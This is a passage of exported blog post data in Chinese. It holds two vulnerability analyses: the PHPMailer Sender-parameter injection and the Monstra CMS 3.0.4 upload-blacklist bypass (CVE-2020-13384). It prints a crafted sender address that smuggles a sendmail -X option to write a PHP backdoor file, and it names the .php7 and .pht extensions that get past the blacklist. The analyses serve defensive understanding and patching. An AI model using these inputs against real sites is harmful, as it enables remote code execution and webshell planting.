src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP1-300x221.jpg\"></a></p>\n<p>对本次漏洞，先看一下官方有什么改动，可以通过改动来推断出漏洞存在的原因。</p>\n<p>如下图所示，本次修复对class.phpmailer.php文件中的mailSend函数进行了改动，函数中的Sender参数进行了过滤。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP2.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP2-300x86.jpg\"></a></p>\n<p>从上图可以看到，这个mailSend函数会将Sender参数处理后赋值给$params变量，当看到$params这个变量时，一些有经验的读者会想到mail函数第五个参数漏洞！的确没错，这个$params参数最终的确传给了mail函数，如下两张图所示。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP3.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP3-300x297.jpg\"></a></p>\n<p>也就是说，我们可以通过控制Sender参数的传入，来构造$params参数，从而利用mail函数的一些特性写入后门文件。</p>\n<p>既然我们已经确定Sender参数为罪魁祸首，接下来我们追踪如何从外部传入并且控制Sender参数，如下图所示，我们追踪到setFrom函数。在这里，$address的值被赋予$Sender。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP4.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP4-300x190.jpg\"></a></p>\n<p>这里的$address就是PHPMailer所提供的用来接收邮件发送方地址的参数。在$address赋值给$Sender之前，需要经历一次过滤，如下图所示</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP5.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP5-300x121.jpg\"></a></p>\n<p>如上图所示，不能让红色框里的if语句判定成立，如果成立了，直接return false了，if条件的结构可以简化为(a or (b or c) and d)，在这里我们要确保$this-&gt;validateAddress($address)为真，才可以避免return false的结局，接下来看一下$this-&gt;validateAddress($address)中的代码。</p>\n<pre class=\"lang:default decode:true \">public static function validateAddress($address, $patternselect = null)\n{\n    if (is_null($patternselect)) {\n        $patternselect = self::$validator;\n    }\n    if (is_callable($patternselect)) {\n        return call_user_func($patternselect, $address);\n    }\n    //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321\n    if (strpos($address, \"\\n\") !== false or strpos($address, \"\\r\") !== false) {\n        return false;\n    }\n    if (!$patternselect or $patternselect == 'auto') {\n        //Check this constant first so it works when extension_loaded() is disabled by safe mode\n        //Constant was added in PHP 5.2.4\n        if (defined('PCRE_VERSION')) {\n            //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2\n            if (version_compare(PCRE_VERSION, '8.0.3') &gt;= 0) {\n                $patternselect = 'pcre8';\n            } else {\n                $patternselect = 'pcre';\n            }\n        } elseif (function_exists('extension_loaded') and extension_loaded('pcre')) {\n            //Fall back to older PCRE\n            $patternselect = 'pcre';\n        } else {\n            //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension\n            if (version_compare(PHP_VERSION, '5.2.0') &gt;= 0) {\n                $patternselect = 'php';\n            } else {\n                $patternselect = 'noregex';\n            }\n        }\n    }\n    switch ($patternselect) {\n        case 'pcre8':\n            /**\n             * Uses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.\n             * @link http://squiloople.com/2009/12/20/email-address-validation/\n             * @copyright 2009-2010 Michael Rushton\n             * Feel free to use and redistribute this code. But please keep this copyright notice.\n             */\n            return (boolean)preg_match(\n                '/^(?!(?&gt;(?1)\"?(?&gt;\\\\\\[ -~]|[^\"])\"?(?1)){255,})(?!(?&gt;(?1)\"?(?&gt;\\\\\\[ -~]|[^\"])\"?(?1)){65,}@)' .\n                '((?&gt;(?&gt;(?&gt;((?&gt;(?&gt;(?&gt;\\x0D\\x0A)?[\\t ])+|(?&gt;[\\t ]*\\x0D\\x0A)?[\\t ]+)?)(\\((?&gt;(?2)' .\n                '(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-\\'*-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]|(?3)))*(?2)\\)))+(?2))|(?2))?)' .\n                '([!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?2)(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\x7F]))*' .\n                '(?2)\")(?&gt;(?1)\\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?&gt;([a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)' .\n                '(?&gt;(?1)\\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\\[(?:(?&gt;IPv6:(?&gt;([a-f0-9]{1,4})(?&gt;:(?6)){7}' .\n                '|(?!(?:.*[a-f0-9][:\\]]){8,})((?6)(?&gt;:(?6)){0,6})?::(?7)?))|(?&gt;(?&gt;IPv6:(?&gt;(?6)(?&gt;:(?6)){5}:' .\n                '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?&gt;((?6)(?&gt;:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' .\n                '|[1-9]?[0-9])(?&gt;\\.(?9)){3}))\\])(?1)$/isD',\n                $address\n            );\n        case 'pcre':\n            //An older regex that doesn't need a recent PCRE\n            return (boolean)preg_match(\n                '/^(?!(?&gt;\"?(?&gt;\\\\\\[ -~]|[^\"])\"?){255,})(?!(?&gt;\"?(?&gt;\\\\\\[ -~]|[^\"])\"?){65,}@)(?&gt;' .\n                '[!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*\")' .\n                '(?&gt;\\.(?&gt;[!#-\\'*+\\/-9=?^-~-]+|\"(?&gt;(?&gt;[\\x01-\\x08\\x0B\\x0C\\x0E-!#-\\[\\]-\\x7F]|\\\\\\[\\x00-\\xFF]))*\"))*' .\n                '@(?&gt;(?![a-z0-9-]{64,})(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)(?&gt;\\.(?![a-z0-9-]{64,})' .\n                '(?&gt;[a-z0-9](?&gt;[a-z0-9-]*[a-z0-9])?)){0,126}|\\[(?:(?&gt;IPv6:(?&gt;(?&gt;[a-f0-9]{1,4})(?&gt;:' .\n                '[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\\]]){8,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?' .\n                '::(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,6})?))|(?&gt;(?&gt;IPv6:(?&gt;[a-f0-9]{1,4}(?&gt;:' .\n                '[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?&gt;[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4})?' .\n                '::(?&gt;(?:[a-f0-9]{1,4}(?&gt;:[a-f0-9]{1,4}){0,4}):)?))?(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}' .\n                '|[1-9]?[0-9])(?&gt;\\.(?&gt;25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\\])$/isD',\n                $address\n            );\n        case 'html5':\n            /**\n             * This is the pattern used in the HTML5 spec for validation of 'email' type form input elements.\n             * @link http://www.whatwg.org/specs/web-apps/current-work/#e-mail-state-(type=email)\n             */\n            return (boolean)preg_match(\n                '/^[a-zA-Z0-9.!#$%&amp;\\'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}' .\n                '[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',\n                $address\n            );\n        case 'noregex':\n            //No PCRE! Do something _very_ approximate!\n            //Check the address is 3 chars or longer and contains an @ that's not the first or last char\n            return (strlen($address) &gt;= 3\n                and strpos($address, '@') &gt;= 1\n                and strpos($address, '@') != strlen($address) - 1);\n        case 'php':\n        default:\n            return (boolean)filter_var($address, FILTER_VALIDATE_EMAIL);\n    }\n}\n</pre>\n\n<p>现在大多都采取’pcre8’方式进行过滤，所以我们的$address必须成功的通过过滤才可以赋值给$this-&gt;Sender.。</p>\n<p>目前已经有研究员构造出可以通过正则过滤的$address结构</p>\n<pre class=\"lang:default decode:true \">xxx( -X/var/www/test.php )@qq.com</pre>\n\n<p>这种结构的$address可以顺利的绕过pcre8正则的检测，接着在程序调用mail发送邮件时，$params参数成功的被拼接成“-fxxx( -X/var/www/success.php )@qq.com”作为额外参数传递给sendmail。在sendmail参数中 –X参数的作用是指定写入log的文件路径，具体描述如下图所示。</p>\n<p><a href=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP6.jpg\"><img src=\"http://blog.nsfocus.net/wp-content/uploads/2017/01/PHP6-300x43.jpg\"></a></p>\n<h2 id=\"漏洞利用\"><a href=\"#漏洞利用\" class=\"headerlink\" title=\"漏洞利用\"></a>漏洞利用</h2><p>漏洞利用的前提是目标站点的web应用必须使用phpmailer函数包，并开启邮件发送功能，这时攻击者可以将构造好的$address（及发送者地址）填入相应表单位置，然后将php指令填写到邮件内容中，如果web应用没有相应的过滤，则可以成功触发phpmailer，将php代码作为日志写入指定的文件中去。</p>\n<h2 id=\"修补防御\"><a href=\"#修补防御\" class=\"headerlink\" title=\"修补防御\"></a>修补防御</h2><p>升级phpmailer至最新版本。</p>\n<p>如果您需要了解更多内容，可以<br>加入QQ群：570982169<br>直接询问：010-68438880</p>"},{"title":"Monstra CMS RCE漏洞分析（CVE-2020-13384）","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2016-NSFOCUS-Security-Report-Regarding-Network-Video-Surveillance-Systems.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","date":"2020-06-08T09:25:21.000Z","_content":"\n前言\n----\n\nMonstraCMS是一套基于PHP与XML的现代化的轻量级内容管理系统，整套系统无需使用数据库，据说是一家乌克兰的公司开发的。\n\n![3f350f22ae8e79de93d135f70c943233.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528162937-5e159052-a0bd-1.png)\n\nMonstra CMS 3.0.4版本中存在着一处安全漏洞，该漏洞源于程序没有正确验证文件扩展名。攻击者可以上传特殊后缀的文件执行任意PHP代码。但是通过分析后发现，这个漏洞的触发是依靠具体环境而来的，下文会详细介绍。\n\n漏洞分析\n--------\n\n首先看一下Monstra CMS的功能页面\n\n![c6750d01e77be3bcee89221884863cb6.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528162956-6970005e-a0bd-1.png)\n\n可以发现有一个文件上传功能。通过阅读后台代码可知，程序是通过黑名单机制限制文件上传的类型：\n\n![e5b8c37dbc5811e6c1eec837d184a4c7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163011-72336f82-a0bd-1.png)\n\n上图即是程序中用来限制上传的黑名单。程序不允许'html', 'htm', 'js', 'jsb', 'mhtml', 'mht', 'php', 'phtml', 'php3', 'php4', 'php5', 'phps','shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh', 'ksh', 'bsh', 'c', 'htaccess', 'htpasswd','exe', 'scr', 'dll', 'msi', 'vbs', 'bat', 'com', 'pif', 'cmd', 'vxd', 'cpl','empty'后缀的文件上传\n\n这个黑名单看起来还是很完善的，几乎防范了所有的类型\n\n但是结合poc来看\n\nhttps://www.exploit-db.com/exploits/48479\n\n![a6b119cc4d4aa35e27b83fefd93fd78d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163025-7a69ee56-a0bd-1.png)\n\npoc中上传了一个名为shell.php7的后门文件\n\n后缀为php7的文件显然是可以绕过黑名单上传成功的，因为黑名单中只过滤了'php',\n'phtml', 'php3', 'php4', 'php5', 'phps'，并未过滤php7后缀的文件上传。\n\n在黑名单里，除了php后缀的文件比较常见，'phtml', 'php3', 'php4', 'php5',\n'phps'这些是什么？为什么要写入上传黑名单里，这些后缀的文件可以被执行吗？\n\n我们测试一下：\n\n在windows下的wamp环境（apache2.4.37）：\n\nphp3后缀：\n\n![782b032b499ed0bf817d5f63d12f6e89.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163041-83ea5da8-a0bd-1.png)\n\n可以被解析\n\nphp5后缀：\n\n![9ed1072ced8aee311a68426fac4c2587.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163055-8c6fec72-a0bd-1.png)\n\n不可以被解析\n\nphp7后缀：\n\n![705954217eaf37eb16955e4a11e7f213.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163111-96043a7c-a0bd-1.png)\n\n不可以被解析\n\nphtml后缀：\n\n![5a15738d7852f72a00a8feaf1bda9564.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163124-9d8878b2-a0bd-1.png)\n\n不可以被解析\n\n再来看下Ubuntu下通过apt安装的环境（apache2.4.18）\n\nphp3后缀：\n\n![cf301b9807e7370f2c87044393635f86.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163135-a4788266-a0bd-1.png)\n\n可以被解析\n\nphp5后缀：\n\n![e8b7fa17820bd058e0ac1b172b11e5d5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163147-aba75396-a0bd-1.png)\n\n可以被解析\n\nphp7后缀：\n\n![1a888a5437d121a79c10c09cff05c8ab.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163158-b25380a2-a0bd-1.png)\n\n可以被解析\n\nphtml后缀：\n\n![ee84ec983118f4e8a67a1eac5d69e80d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163210-b96931de-a0bd-1.png)\n\n可以被解析\n\n在处理php5、php7以及phtml后缀时，两个不同系统下不同版本的apache有着不同的处理方式。首先来说说这些不同的后缀到底是什么，再从原理上来看看为什么会导致解析结果的不同\n\n据笔者猜测，不同的php后缀形式是用来标识此php文件的版本或者类型的\n\n例如后缀为phtml的文件：\n\nPHTML，正如其命名方式：是一种PHP脚本嵌在网页的HTML代码之中的文件。在页面被发送给请求的用户之前，后台服务器调用PHP来解释和执行PHP脚本。用后缀为phtml来标识这类php文件中嵌套着HTML代码\n\n例如后缀为php+数字的文件：\n\n用来标识当前php文件所采用的php开发版本，例如'php3', 'php4', 'php5',\n'php7'对应了php的3、4、5、7版本号\n\n至于为什么没有php2呢？我查了一下php的历史版本\n\n![02312b54166d08e23d37e2a149e04990.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163228-c3e53e32-a0bd-1.png)\n\n从历史记录来看，php3才是现在使用的php的第一个版本，因此从php3开始标记\n\n所以'phtml', 'php3', 'php4', 'php5'，只是用来标识这个php文件的特点，但是后台仍然要把这个当作php文件解析\n\n至于黑名单中并未过滤php7后缀的文件上传，可能是这套系统在开发时，php7还没有正式发行，开发者也就没有写入其中\n\n但是为什么后台可以把这些后缀的文件当成php文件来解析呢？上文对于php5以及php7、phtml的解析结果为什么不同呢？\n\n首先来看下windows下的apache关于后缀解析的配置，位于apache2.4.37/conf/mime.types\n\n![c60b097e2358297d14fd511aa4ab6dfc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163241-cbb52906-a0bd-1.png)\n\n此文件设置从文件扩展名到内容类型的默认映射列表。于此同时，httpd.conf通过提供大多数媒体类型定义以此简化mime.types文件，可以在httpd.conf中使用AddType指令根据需要进行指令覆盖。\n\n通过查看可以发现，mime.types这里并没有定义php相关的后缀应该如何解析，接着我们看下httpd.conf，位于：apache2.4.37/conf/httpd.conf\n\n![b87fa57b3829db6185f30f0fda32a78f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163258-d59c398c-a0bd-1.png)\n\n可以看到存在\n\nAddType application/x-httpd-php .php\n\nAddType application/x-httpd-php .php3\n\n这样的代码\n\n官网中关于AddType 的解释如下：\n\n![ab8271a46676e5f496a475798e1a5a7a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163311-ddc112a4-a0bd-1.png)\n\nAddType *media-type* *extension* [*extension*] ...\n\n该指令将给定的文件扩展名映射到指定的内容类型，media-type是用于包含extension的文件名的媒体类型。\n\n这里的配置将会在处理php和php3扩展名的文件将会被标记上applciation/x-httpd-php，将二者标识为可以执行php的文件类型。\n\n![137c440cf13bdcf7946a5619f21afdcd.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163326-e64814ae-a0bd-1.png)\n\n从这里可以发现，系统可以把php以及php3的后缀当成php进行解析，而php5、php7、phtml后缀由于没有配置，不可以被解析。\n\n接下来看一下Ubuntu下apache关于后缀解析的配置，位于/etc/mime.types\n\n![152a4c2ac540ca6347f593654f0f2e54.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163340-eeb8acfc-a0bd-1.png)\n\n可以看到，里面定义了phtml、php3、php5扩展名到内容类型的映射列表，但是并没有php7。接下来看下/etc/apache2/mods-enabled/php7.0.conf\n\n![ea8225ca1e6d43a5496d9a41348cd3d9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163352-f5dc0b82-a0bd-1.png)\n\n注意看第一个FilesMatch\n\n![9026b4ce9a18c8e60d6a4aeb853a1fbc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163405-fdd299c8-a0bd-1.png)\n\n正则表达式.+\\\\.ph(p[3457]?\\|t\\|tml)\\$ 匹配到的扩展名，都将被标记上applciation/x-httpd-php，当成php文件解析。因此这里可以解析php7以及phtml后缀\n\n如果想要让windows环境下的apache解析php5以及php7扩展名，在apache2.4.37/conf/httpd.conf文件中添加如下两行即可\n\n![bb69baaf6abe2c091ce305d71dd5e848.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163418-058c06fe-a0be-1.png)\n\n但是默认情况下，笔者的windows环境下的apache是无法解析php7扩展名的文件，因此这个漏洞对笔者的这个环境无效。\n\n那在笔者Ubuntu apache环境下，可以上传的poc除了可以以php7为后缀，还可以是什么形式呢？\n\n经过实验发现，Pht后缀也是可以的\n\n![3216eb122ea45fe1e2ef17d0a9b9d6cc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163431-0d89f2da-a0be-1.png)\n\n黑名单里根本没有pht后缀限制，正则表达式正则表达式.+\\\\.ph(p[3457]?\\|t\\|tml)\\$也可以匹配到pht，因此pht后缀在笔者的环境中也可以被执行\n\n![6107078502027f19a212e57390fa1c93.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163447-16ee790e-a0be-1.png)","source":"_posts/Monstra-CMS-RCE.md","raw":"---\ntitle: Monstra CMS RCE漏洞分析（CVE-2020-13384）\ntags: web漏洞分析\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/2016-NSFOCUS-Security-Report-Regarding-Network-Video-Surveillance-Systems.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\ndate: 2020-06-08 17:25:21\n---\n\n前言\n----\n\nMonstraCMS是一套基于PHP与XML的现代化的轻量级内容管理系统，整套系统无需使用数据库，据说是一家乌克兰的公司开发的。\n\n![3f350f22ae8e79de93d135f70c943233.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528162937-5e159052-a0bd-1.png)\n\nMonstra CMS 3.0.4版本中存在着一处安全漏洞，该漏洞源于程序没有正确验证文件扩展名。攻击者可以上传特殊后缀的文件执行任意PHP代码。但是通过分析后发现，这个漏洞的触发是依靠具体环境而来的，下文会详细介绍。\n\n漏洞分析\n--------\n\n首先看一下Monstra CMS的功能页面\n\n![c6750d01e77be3bcee89221884863cb6.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528162956-6970005e-a0bd-1.png)\n\n可以发现有一个文件上传功能。通过阅读后台代码可知，程序是通过黑名单机制限制文件上传的类型：\n\n![e5b8c37dbc5811e6c1eec837d184a4c7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163011-72336f82-a0bd-1.png)\n\n上图即是程序中用来限制上传的黑名单。程序不允许'html', 'htm', 'js', 'jsb', 'mhtml', 'mht', 'php', 'phtml', 'php3', 'php4', 'php5', 'phps','shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh', 'ksh', 'bsh', 'c', 'htaccess', 'htpasswd','exe', 'scr', 'dll', 'msi', 'vbs', 'bat', 'com', 'pif', 'cmd', 'vxd', 'cpl','empty'后缀的文件上传\n\n这个黑名单看起来还是很完善的，几乎防范了所有的类型\n\n但是结合poc来看\n\nhttps://www.exploit-db.com/exploits/48479\n\n![a6b119cc4d4aa35e27b83fefd93fd78d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163025-7a69ee56-a0bd-1.png)\n\npoc中上传了一个名为shell.php7的后门文件\n\n后缀为php7的文件显然是可以绕过黑名单上传成功的，因为黑名单中只过滤了'php',\n'phtml', 'php3', 'php4', 'php5', 'phps'，并未过滤php7后缀的文件上传。\n\n在黑名单里，除了php后缀的文件比较常见，'phtml', 'php3', 'php4', 'php5',\n'phps'这些是什么？为什么要写入上传黑名单里，这些后缀的文件可以被执行吗？\n\n我们测试一下：\n\n在windows下的wamp环境（apache2.4.37）：\n\nphp3后缀：\n\n![782b032b499ed0bf817d5f63d12f6e89.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163041-83ea5da8-a0bd-1.png)\n\n可以被解析\n\nphp5后缀：\n\n![9ed1072ced8aee311a68426fac4c2587.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163055-8c6fec72-a0bd-1.png)\n\n不可以被解析\n\nphp7后缀：\n\n![705954217eaf37eb16955e4a11e7f213.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163111-96043a7c-a0bd-1.png)\n\n不可以被解析\n\nphtml后缀：\n\n![5a15738d7852f72a00a8feaf1bda9564.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163124-9d8878b2-a0bd-1.png)\n\n不可以被解析\n\n再来看下Ubuntu下通过apt安装的环境（apache2.4.18）\n\nphp3后缀：\n\n![cf301b9807e7370f2c87044393635f86.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163135-a4788266-a0bd-1.png)\n\n可以被解析\n\nphp5后缀：\n\n![e8b7fa17820bd058e0ac1b172b11e5d5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163147-aba75396-a0bd-1.png)\n\n可以被解析\n\nphp7后缀：\n\n![1a888a5437d121a79c10c09cff05c8ab.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163158-b25380a2-a0bd-1.png)\n\n可以被解析\n\nphtml后缀：\n\n![ee84ec983118f4e8a67a1eac5d69e80d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163210-b96931de-a0bd-1.png)\n\n可以被解析\n\n在处理php5、php7以及phtml后缀时，两个不同系统下不同版本的apache有着不同的处理方式。首先来说说这些不同的后缀到底是什么，再从原理上来看看为什么会导致解析结果的不同\n\n据笔者猜测，不同的php后缀形式是用来标识此php文件的版本或者类型的\n\n例如后缀为phtml的文件：\n\nPHTML，正如其命名方式：是一种PHP脚本嵌在网页的HTML代码之中的文件。在页面被发送给请求的用户之前，后台服务器调用PHP来解释和执行PHP脚本。用后缀为phtml来标识这类php文件中嵌套着HTML代码\n\n例如后缀为php+数字的文件：\n\n用来标识当前php文件所采用的php开发版本，例如'php3', 'php4', 'php5',\n'php7'对应了php的3、4、5、7版本号\n\n至于为什么没有php2呢？我查了一下php的历史版本\n\n![02312b54166d08e23d37e2a149e04990.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163228-c3e53e32-a0bd-1.png)\n\n从历史记录来看，php3才是现在使用的php的第一个版本，因此从php3开始标记\n\n所以'phtml', 'php3', 'php4', 'php5'，只是用来标识这个php文件的特点，但是后台仍然要把这个当作php文件解析\n\n至于黑名单中并未过滤php7后缀的文件上传，可能是这套系统在开发时，php7还没有正式发行，开发者也就没有写入其中\n\n但是为什么后台可以把这些后缀的文件当成php文件来解析呢？上文对于php5以及php7、phtml的解析结果为什么不同呢？\n\n首先来看下windows下的apache关于后缀解析的配置，位于apache2.4.37/conf/mime.types\n\n![c60b097e2358297d14fd511aa4ab6dfc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163241-cbb52906-a0bd-1.png)\n\n此文件设置从文件扩展名到内容类型的默认映射列表。于此同时，httpd.conf通过提供大多数媒体类型定义以此简化mime.types文件，可以在httpd.conf中使用AddType指令根据需要进行指令覆盖。\n\n通过查看可以发现，mime.types这里并没有定义php相关的后缀应该如何解析，接着我们看下httpd.conf，位于：apache2.4.37/conf/httpd.conf\n\n![b87fa57b3829db6185f30f0fda32a78f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163258-d59c398c-a0bd-1.png)\n\n可以看到存在\n\nAddType application/x-httpd-php .php\n\nAddType application/x-httpd-php .php3\n\n这样的代码\n\n官网中关于AddType 的解释如下：\n\n![ab8271a46676e5f496a475798e1a5a7a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163311-ddc112a4-a0bd-1.png)\n\nAddType *media-type* *extension* [*extension*] ...\n\n该指令将给定的文件扩展名映射到指定的内容类型，media-type是用于包含extension的文件名的媒体类型。\n\n这里的配置将会在处理php和php3扩展名的文件将会被标记上applciation/x-httpd-php，将二者标识为可以执行php的文件类型。\n\n![137c440cf13bdcf7946a5619f21afdcd.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163326-e64814ae-a0bd-1.png)\n\n从这里可以发现，系统可以把php以及php3的后缀当成php进行解析，而php5、php7、phtml后缀由于没有配置，不可以被解析。\n\n接下来看一下Ubuntu下apache关于后缀解析的配置，位于/etc/mime.types\n\n![152a4c2ac540ca6347f593654f0f2e54.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163340-eeb8acfc-a0bd-1.png)\n\n可以看到，里面定义了phtml、php3、php5扩展名到内容类型的映射列表，但是并没有php7。接下来看下/etc/apache2/mods-enabled/php7.0.conf\n\n![ea8225ca1e6d43a5496d9a41348cd3d9.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163352-f5dc0b82-a0bd-1.png)\n\n注意看第一个FilesMatch\n\n![9026b4ce9a18c8e60d6a4aeb853a1fbc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163405-fdd299c8-a0bd-1.png)\n\n正则表达式.+\\\\.ph(p[3457]?\\|t\\|tml)\\$ 匹配到的扩展名，都将被标记上applciation/x-httpd-php，当成php文件解析。因此这里可以解析php7以及phtml后缀\n\n如果想要让windows环境下的apache解析php5以及php7扩展名，在apache2.4.37/conf/httpd.conf文件中添加如下两行即可\n\n![bb69baaf6abe2c091ce305d71dd5e848.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163418-058c06fe-a0be-1.png)\n\n但是默认情况下，笔者的windows环境下的apache是无法解析php7扩展名的文件，因此这个漏洞对笔者的这个环境无效。\n\n那在笔者Ubuntu apache环境下，可以上传的poc除了可以以php7为后缀，还可以是什么形式呢？\n\n经过实验发现，Pht后缀也是可以的\n\n![3216eb122ea45fe1e2ef17d0a9b9d6cc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163431-0d89f2da-a0be-1.png)\n\n黑名单里根本没有pht后缀限制，正则表达式正则表达式.+\\\\.ph(p[3457]?\\|t\\|tml)\\$也可以匹配到pht，因此pht后缀在笔者的环境中也可以被执行\n\n![6107078502027f19a212e57390fa1c93.png](https://xzfile.aliyuncs.com/media/upload/picture/20200528163447-16ee790e-a0be-1.png)","slug":"Monstra-CMS-RCE","published":1,"updated":"2020-10-28T00:59:48.819Z","_id":"ckgrozu8m0015wsa9e7vn392q","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>MonstraCMS是一套基于PHP与XML的现代化的轻量级内容管理系统，整套系统无需使用数据库，据说是一家乌克兰的公司开发的。</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528162937-5e159052-a0bd-1.png\" alt=\"3f350f22ae8e79de93d135f70c943233.png\"></p>\n<p>Monstra CMS 3.0.4版本中存在着一处安全漏洞，该漏洞源于程序没有正确验证文件扩展名。攻击者可以上传特殊后缀的文件执行任意PHP代码。但是通过分析后发现，这个漏洞的触发是依靠具体环境而来的，下文会详细介绍。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>首先看一下Monstra CMS的功能页面</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528162956-6970005e-a0bd-1.png\" alt=\"c6750d01e77be3bcee89221884863cb6.png\"></p>\n<p>可以发现有一个文件上传功能。通过阅读后台代码可知，程序是通过黑名单机制限制文件上传的类型：</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200528163011-72336f82-a0bd-1.png\" alt=\"e5b8c37dbc5811e6c1eec837d184a4c7.png\"></p>\n<p>上图即是程序中用来限制上传的黑名单。程序不允许’html’, ‘htm’, ‘js’, ‘jsb’, ‘mhtml’, ‘mht’, ‘php’, ‘phtml’, ‘php3’, ‘php4’, ‘php5’, ‘phps’,’shtml’, ‘jhtml’, ‘pl’, ‘py’, ‘cgi’, ‘sh’, ‘ksh’, ‘bsh’, ‘c’, ‘htaccess’, ‘htpasswd’,’exe’, ‘scr’, ‘dll’, ‘msi’, ‘vbs’, ‘bat’, ‘com’, ‘pif’, ‘cmd’, ‘vxd’, ‘cpl’,’empty’后缀的文件上传</p>\n<p>这个黑名单看起来还是很完善的，几乎防范了所有的类型</p>\n<p>但是结合poc来看</p>\n<p><a 